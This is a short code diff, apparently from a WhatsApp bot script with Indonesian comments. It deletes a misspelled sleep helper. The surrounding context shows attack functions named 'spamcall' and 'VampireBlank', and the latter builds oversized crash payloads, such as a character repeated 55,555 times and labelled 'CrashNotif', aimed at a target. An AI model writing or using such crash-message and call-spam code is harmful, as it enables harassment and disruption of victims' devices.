@@ -231,9 +231,6 @@ async function spamcall(target) {
         sock.ws.close(); // Tutup koneksi WebSocket
     }
 }
-asnyc function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
 async function VampireBlank(target, ptcp = true) {
   const Vampire = `_*~@8~*_\n`.repeat(10500);
   const CrashNotif = 'ꦽ'.repeat(55555);
